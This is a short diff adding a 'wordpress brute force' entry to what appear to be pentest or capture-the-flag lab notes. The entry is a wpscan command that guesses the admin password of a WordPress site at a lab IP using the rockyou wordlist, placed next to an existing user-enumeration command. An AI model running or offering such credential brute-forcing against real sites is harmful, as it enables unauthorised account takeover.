@@ -41,6 +41,11 @@ wordpress scan
 wpscan --url blog.thm --enumerate u
 ```
 
+wordpress brute force
+```
+wpscan --url http://10.10.70.68/blog/ --usernames admin --passwords /usr/share/wordlists/rockyou.txt
+```
+
 joomla scan
 
 ```
